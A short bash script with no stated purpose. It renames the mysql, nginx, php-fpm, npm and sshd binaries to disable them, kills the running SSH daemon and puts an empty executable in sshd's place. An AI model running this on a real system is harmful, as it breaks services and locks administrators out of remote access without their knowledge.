#!/bin/bash

bad_commands=(
  '/etc/init.d/mysql'
  '/etc/init.d/php5-fpm'
  '/etc/init.d/nginx'
  '/etc/init.d/nginx'
  '/usr/bin/npm'
  '/usr/bin/cnpm'
  '/usr/bin/mysql'
  '/usr/sbin/sshd'
)

for command in ${bad_commands[@]};  
do  
  if [ -f "$command" ]; then
    mv $command ${command%/*}/_${command##*/}
  fi
done

pkill sshd
touch /usr/sbin/sshd
chmod +x /usr/sbin/sshd